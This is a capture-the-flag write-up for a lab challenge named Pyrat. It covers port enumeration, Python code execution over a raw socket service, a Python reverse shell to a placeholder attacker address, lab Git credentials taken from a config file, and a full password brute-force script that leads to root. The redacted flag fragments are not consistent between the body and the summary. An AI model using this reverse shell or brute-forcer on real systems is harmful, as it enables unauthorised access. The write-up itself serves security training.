# Pyrat CTF Write-up

## Overview
This write-up covers the complete methodology, tools, scripts, and logic used to solve the Pyrat CTF challenge. The main objective was to gain initial access, escalate privileges, and ultimately retrieve the `root.txt` flag.

---

## Step 1: Initial Enumeration

### Nmap Scan
```bash
nmap -p- -sV -sC -A <target-ip>
```
Port 8000 responded with an HTTP service that did not behave like a traditional web server. Visiting the webpage gave clues to try a more basic connection (e.g., Netcat or Telnet).

### Connecting via Netcat
```bash
nc <target-ip> 8000
```
Once connected, arbitrary input returned syntax errors or specific messages, hinting at a custom Python socket server.

---

## Step 2: Confirming Python Code Execution
Tested a Python payload:
```python
print(__import__('os').popen('whoami').read())
```
Response: running as `www-data`.

---

## Step 3: Reverse Shell for Stability
Sent a Python reverse shell:
```python
__import__('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker-ip>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh"])'")
```

Listener:
```bash
nc -lvnp 4444
```

---

## Step 4: Privilege Escalation Enumeration

### SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```
Found: `pkexec` (version 0.105) — vulnerable to **CVE-2021-3560**

### LinPEAS Output
Also flagged **CVE-2021-3156** (Baron Samedit).

---

## Step 5: Source Code Discovery

Discovered a `.git` directory at:
```
/opt/dev/.git
```

Extracted Git config:
```bash
cat config
```
Found:
```
[user]
    name = Jose Mario
    email = josemlwdf@github.com

[credential]
    helper = cache --timeout=3600

[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_
```

Used to escalate:
```bash
su think
# password: _TH1NKINGPirate$_
```

Captured user flag:
```bash
cat /home/think/user.txt
996bdb1{Redacted}17cabca5454705
```

---

## Step 6: Analyzing Application Source Code

Found a backup:
```bash
git show HEAD:pyrat.py.old
```

Discovered:
```python
if data == 'admin':
    # triggers authentication check
```

Typing `admin` triggered a password prompt.

---

## Step 7: Brute-force Admin Shell Access

### Python Brute-force Script
```python
import socket

target_ip = "<target-ip>"
target_port = 8000
password_wordlist = "/usr/share/wordlists/rockyou.txt"

def connect_and_send_password(password):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))
        client_socket.sendall(b'admin\n')

        response = client_socket.recv(1024).decode()
        if "Password:" in response:
            client_socket.sendall(password.encode() + b"\n")
            response = client_socket.recv(1024).decode()
            if "success" in response.lower() or "admin" in response.lower():
                print(f"✅ Password FOUND: {password}")
                return True
        return False
    except:
        return False
    finally:
        client_socket.close()

def fuzz_passwords():
    with open(password_wordlist, "r", encoding="latin-1") as file:
        for password in file:
            password = password.strip()
            if connect_and_send_password(password):
                break

if __name__ == "__main__":
    fuzz_passwords()
```

Result:
```
✅ Password FOUND: abc123
Welcome Admin!!! Type "shell" to begin
```

Typing `shell` granted root shell access.

---

## Step 8: Capture the Flag
```bash
cat /root/root.txt
ba5ed03e{Redacted}54438480165e221
```

---

## Summary of Key Payloads

- **Initial shell:**
```python
__import__('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker-ip>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh"])'")
```

- **Git credentials:**
```
username = think
password = _TH1NKINGPirate$_
```

- **Final password:** `abc123`

- **Flags:**
  - User: `996bdb1{Redacted}1417cabca5454705`
  - Root: `ba5ed03e{Redacted}4438480165e221`

---

## 🧠 Conclusion
This CTF required a blend of enumeration, source code analysis, reverse shell techniques, and creative brute-forcing. The biggest breakthrough came from inspecting the `.git` directory, which revealed valid user credentials. Recognizing the custom socket service and patiently fuzzing allowed for root access and full flag capture.

